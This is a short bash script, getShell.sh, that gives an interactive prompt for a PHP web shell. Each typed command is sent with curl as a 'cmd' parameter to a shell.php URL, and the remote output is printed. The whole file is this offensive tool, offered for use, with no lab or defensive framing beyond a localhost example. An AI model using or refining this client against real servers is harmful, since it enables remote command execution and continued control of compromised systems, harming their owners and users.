#!/bin/bash

# Colors #########################
greenColor="\e[0;32m\033[1m"
endColor="\033[0m\e[0m"
redColor="\e[0;31m\033[1m"
blueColor="\e[0;34m\033[1m"
yellowColor="\e[0;33m\033[1m"
purpleColor="\e[0;35m\033[1m"
turquoiseColor="\e[0;36m\033[1m"
grayColor="\e[0;37m\033[1m"
##################################

# GLOBALS ########################
declare -a local_path
#echo $PATH > PATH.txt
#declare -r my_path="/home/lautaro/.local/bin:/usr/lib/jvm/java-21-openjdk/bin:/home/lautaro/.cargo/bin:/home/lautaro/.config/bspwm/scripts:/usr/local/bin:/usr/bin:/var/lib/snapd/snap/bin:/usr/local/sbin:/opt/android-sdk/platform-tools:/usr/lib/jvm/default/bin:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl"
declare -r my_path=$PATH

# CTRL C #########################
trap ctrl_c INT
function ctrl_c(){
	echo -e "\n${redColor}[*] Exiting...${endColor}\n"
	exit 0
}

# Help Panel #####################
function helpPanel(){
	echo -e "${greenColor}[*] Use: ${endColor}${grayColor}./getShell.sh${endColor}"
	echo -e "\t${greenColor}-u${endColor} ${grayColor}URL${endColor}"
	echo -e "\t${greenColor}-h${endColor} ${grayColor}This panel${endColor}"
	echo -e "\n\t${greenColor}[*] Example: ${endColor}${grayColor}./getShell.sh -u http://127.0.0.1:1337/shell.php${endColor}\n"
	exit 0
}

# MAKE REQUEST ###################
function makeRequest(){
	echo -e "\n${greenColor}"
	curl "$url?cmd=$1"
	echo -ne "${endColor}"

}

# SHELL ##########################
function shell(){
	for path in $(echo $my_path | tr ':' ' '); do
		local_path+=($path)
	done
#	for element in ${path[@]}; do
#		echo "Path $element"
#	done

	while [ "$command" != "exit" ]; do
		counter=0; echo -ne "\n${grayColor}Lautaro >_${endColor} " && read -r command

		for element in ${local_path[@]}; do
			if [ -x $element/$(echo $command | awk '{print $1}') ]; then
				let counter+=1
				break
			elif [ "$(echo $command | awk '{print $1}')" == "cd" ]; then
				let counter+=1
				break
			fi
		done

		if [ $counter -eq 1 ]; then
			command=$(echo $command | tr ' ' '+')
			makeRequest $command
		else
			echo -e "\n${redColor}[!] Error, command ${endColor}${grayColor}$(echo $command | awk '{print $1}')${endColor}${redColor} not found!${endColor}"
		fi


		if [ "$command" == "exit" ]; then
			ctrl_c
		fi
	done

}

# MAIN ###########################
declare -i parameter_counter=0; while getopts ":u:h:" arg; do
	case $arg in
		u) url=$OPTARG; let parameter_counter+=1 ;;
		h) helpPanel ;;
	esac
done

if [ $parameter_counter -ne 1 ]; then
	helpPanel
else
	shell
fi



